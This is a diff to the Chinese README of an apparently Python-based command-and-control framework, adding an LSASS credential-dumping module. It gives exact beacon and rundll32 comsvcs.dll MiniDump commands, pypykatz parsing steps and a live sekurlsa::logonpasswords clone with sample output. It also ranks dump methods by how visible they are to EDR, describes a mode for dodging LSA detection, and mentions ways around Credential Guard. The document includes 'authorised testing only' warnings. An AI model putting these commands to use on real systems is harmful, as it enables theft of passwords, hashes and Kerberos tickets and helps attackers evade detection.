@@ -27,7 +27,8 @@
 - **加密**（`cs/crypto/`）：纯 Python AES-GCM 通道加密 + 为 HTTPS 监听器自动生成
   自签 TLS 证书。
 - **能力模块**（`cs/modules/`）：持久化、进程注入、反取证、混淆、利用阶段辅助、
-  SOCKS5 内网穿透、门控的系统原生凭据数据接口。
+  SOCKS5 内网穿透、门控的系统原生凭据数据接口、LSASS 进程转储与 sekurlsa 在线解析
+  （后两者仅限授权测试）。
 - **编译二进制**（`scripts/build-binary.sh`）：用 PyInstaller 把 beacon 打成独立
   可执行文件（64/32 位）。注意 PyInstaller 不支持交叉编译：请在目标同架构上运行
   该脚本。PE 投递链（`cs/modules/dropper.py`）生成用于 Windows 拉取并运行的
@@ -71,6 +72,9 @@ python3 b.py
 | `selfdestruct <path>` | 覆写删除本 beacon 文件与临时副本后退出。 |
 | `socks <port>` / `socks-stop` | 在 beacon 上启动/停止 SOCKS5 内网穿透代理。 |
 | `creds [env|windows|linux|all]` | 枚举操作系统向**当前用户**暴露的凭据（见下“门控凭据接口”）。 |
+| `lsass <out.dmp> [comsvcs\|ctypes]` | 把 LSASS 进程内存 dump 成 minidump（仅 Windows，需管理员）。见下“LSASS 进程内存转储”章节。 |
+| `lsass-parse <dump_path>` | 用 pypykatz 解析 LSASS minidump（操作端）。 |
+| `sekurlsa [--pkgs ...] [--pid ...] [--no-lsa]` | 从 LSASS 内存**在线**解析 SSP 凭据（mimikatz `sekurlsa::logonpasswords` 等价，仅 Windows，需管理员）。见下章节。 |
 
 ## 反弹 Shell（bash 回调 → 交互式 Shell）
 
@@ -139,6 +143,128 @@ beacon 命令 `creds [env|windows|linux|all]` 只报告操作系统通过**文�
 向**调用用户**暴露的凭据：Windows 凭据管理器（`cmdkey`）、用户环境变量、（Linux）
 会话内核密钥环。它**不是** Mimikatz 转储——不会抓取 LSASS 内存、也不恢复账号口令，
 并且不会对非操作端自己的测试主机以外的账号起作用。仅用于你有权测试的系统。
+
+## LSASS 进程内存转储（仅 Windows；需管理员）
+
+> ⚠️ **仅限授权安全测试。** 本模块生成 `lsass.exe` 的 minidump——即 mimikatz
+> `sekurlsa::minidump` 的能力。在非管理员主机上会干净地失败（返回清晰的
+> `SeDebugPrivilege` / `OpenProcess` 错误），不会写任何文件。切勿投放到你没有
+> 书面授权权限的系统。
+
+beacon 命令 `lsass <out_path> [comsvcs|ctypes]` 把 LSASS 进程内存转储为 `.dmp`
+文件。两种策略：
+
+| `prefer=` | 机制 | EDR 可见性 |
+|---|---|---|
+| `comsvcs`（默认） | `rundll32 comsvcs.dll, MiniDump <pid> <out> full`——由系统自带的已签名二进制完成转储，mimikatz 默认方式 | 最低——`dbghelp.dll` 不会加载进 beacon 进程 |
+| `ctypes` | 直接经 `dbghelp.dll` 调用 `MiniDumpWriteDump`（先启用 `SeDebugPrivilege`） | 较高——多数 EDR 会对 lsass.exe 上的 dbghelp+MiniDumpWriteDump 报警 |
+
+```bash
+beacon[<sid>]> lsass C:\Windows\Temp\ls.dmp
+beacon[<sid>]> lsass C:\Windows\Temp\ls.dmp ctypes    # 显式策略
+```
+
+`.dmp` 写在目标机上。传回操作端（用 `download` 或任何 exfil 通道）后，在操作端用
+**pypykatz** 解析：
+
+```bash
+# 操作端：
+pip install pypykatz
+python3 -m pypykatz lsadump lsass.dmp
+# 或使用内置 CLI 驱动：
+pip install -e '.[lsass]'
+cscli parse-lsass lsass.dmp
+```
+
+beacon 命令 `lsass-parse <dump_path>` 在目标机上执行同样的 pypykatz 解析（若
+pypykatz 已装在那里）——但通常应把解析放到操作端。
+
+**能从转储恢复什么**：WDigest 明文（WDigest credssp 开启时；Win8.1+ 默认关闭但
+仍有很多人重新开启）、NTLM 哈希、Kerberos TGT/TGS 票证、DPAPI master keys、
+当前用户的凭据管理器条目、（启用 LM 时）LM 哈希。ATT&CK **T1003.001**。
+
+**限制**：beacon 需以**管理员**运行（本地 Administrators 组成员即可——LSASS 默认
+给 Admin 全权限）。非管理员 beacon 上 `dump_lsass` 返回 `(False,
+"failed to enable SeDebugPrivilege (run as admin)")` 且不写文件。模块拒绝在非
+Windows 主机上运行。
+
+该模块随标准 payload 一起发布，生成的 `beacon.py` 已包含它——见
+`cs/payload/__init__.py` 的 `_MODULE_FILES`。
+
+## sekurlsa::logonpasswords（在线 LSASS 解析；仅 Windows；需管理员）
+
+> ⚠️ **仅限授权安全测试。** 这是 mimikatz `sekurlsa::logonpasswords` 基于
+> pypykatz 的 Python 复刻。它**在进程内**读取 `lsass.exe` 内存，**不写任何转储文件**
+> ——解析出的凭据直接回传给操作端。切勿在无书面授权的系统上使用。
+
+beacon 命令 `sekurlsa` 通过 pypykatz 的 `LiveReader` + `apypykatz.start()` 读取
+实时 `lsass.exe` 内存，并以 mimikatz 风格输出：
+
+```bash
+beacon[<sid>]> sekurlsa
+beacon[<sid>]> sekurlsa --pkgs msv,wdigest,kerberos        # 只跑子集
+beacon[<sid>]> sekurlsa --pid 1234                          # 指定 PID
+beacon[<sid>]> sekurlsa --no-lsa                            # 跳过 LSA 步骤
+                                                          # （更快，但拿不到明文）
+```
+
+输出示例：
+
+```
+sekurlsa::logonpasswords
+============================================================
+
+Authentication Id : 0;996
+Session           : Service
+User Name         : svc_sql
+Domain            : CONTOSO
+Logon Server      : DC01
+Logon Time        : 2025-01-15 10:30:45
+SID               : S-1-5-...
+
+	msv :
+	 [Primary]
+	 * Username      : svc_sql
+	 * Domain        : CONTOSO
+	 * NTLM          : aad3b435b51404eeaad3b435b51404ee
+	 * SHA1          : da39a3ee5e6b4b0d3255bfef95601890afd80709
+
+	wdigest :
+	 * Username      : svc_sql
+	 * Domain        : CONTOSO
+	 * Password      : P@ssw0rd!
+
+	kerberos :
+	 ...
+```
+
+**支持的 SSP 包**（默认一次全跑）：`msv`、`wdigest`、`kerberos`（`--pkgs` 含
+`ktickets` 时恢复票证）、`tspkg`、`ssp`、`livessp`、`dpapi`、`cloudap`。
+
+**它能在哪运行**：
+
+| 场景 | 需要 pypykatz？ |
+|---|---|
+| 标准 `cscli --payload` 生成的 `beacon.py` | 否——sekurlsa 不可用，回退到 `lsass <path>` 转储工作流 |
+| **PyInstaller 编译的** `cscli-beacon.exe`（在装有 `pip install pypykatz` 的主机上 `./scripts/build-binary.sh windows64`） | 是——pypykatz 会被 PyInstaller 自动打包 |
+| 操作端本地直接 `cscli sekurlsa [--pid <pid>]` | 是——操作端需已装 pypykatz |
+
+这种划分是有意为之：pypykatz + 传递依赖有数 MB，无法内联进 stdlib-only 的单文件
+payload。PyInstaller beacon 则把所有东西打进二进制。
+
+**目标端前置条件**：
+- Windows；Python 解释器位数必须与系统一致（64 位 Windows 用 64 位 Python——
+  pypykatz 的 `LiveReader.sanity_check()` 强制检查）。
+- beacon / 操作端必须是**管理员**（本地 Administrators 组成员即可）。
+- LSASS **不得**以 Protected Process Light（PPL）运行。Win 11 22H2+ 开了 Credential
+  Guard 时 `OpenProcess` 会返回 `ERROR_ACCESS_DENIED`。绕过需要先关闭 Credential
+  Guard（组策略 / 注册表 + 重启）或加载内核驱动去除保护。本模块未实现。
+
+**`--no-lsa` 模式**：跳过 LSA 模板 / 解密密钥获取。更快，但失去了解密 WDigest /
+Kerberos / TSPKG / SSP / LiveSSP 明文的 LSA 会话密钥——只有 MSV（NT/LM 哈希）保留。
+适合 LSA 检测触发但仍想拿 NTLM 哈希离线爆破的场景。
+
+**ATT&CK T1003.001** —— 操作系统凭据转储：LSASS 内存。
 
 ## 混淆与利用阶段辅助
 
@@ -277,7 +403,7 @@ cscli> delete <session_id> [--force]         # 交互式
 
 ## 测试
 
-仓库自带 6 个自测（全部本地回环，无跨主机 C2 流量）：
+仓库自带自测（全部本地回环，无跨主机 C2 流量）：
 
 ```bash
 python3 test_e2e.py      # API 级：存储 + 监听器 + 进程内往返
@@ -290,6 +416,8 @@ python3 test_cli_driver.py # 非交互式 CLI 驱动（server/payload/list/task/
 python3 test_rsh.py        # 裸 TCP 反弹 shell（真实 bash 回调）进程内
 python3 test_rsh_cli.py    # 非交互式 CLI 驱动的反弹 shell
 python3 test_resilience.py # 断线自动重连 + disconnect/delete
+python3 test_lsass.py      # LSASS 转储模块单元测试（非 Windows 拒绝、
+                           #   parse_dump 错误路径、sekurlsa 输出格式）
 ```
 
 ## 目录结构
@@ -305,7 +433,8 @@ cs/
   payload/               # 独立 payload 生成（内联全部依赖）
   modules/               # persistence、injection、antiforensics、obfuscation、
                          #   socks（SOCKS5 穿透）、credentials、dropper（PE 链）、
-                         #   exploitation
+                         #   exploitation、lsass（LSASS 转储 + sekurlsa 在线解析；
+                         #   两者仅限授权测试）
   cli/console.py         # 交互式操作端 CLI
 build/beacon_entry.py    # PyInstaller 入口
 scripts/build-binary.sh  # 编译独立 beacon 可执行文件
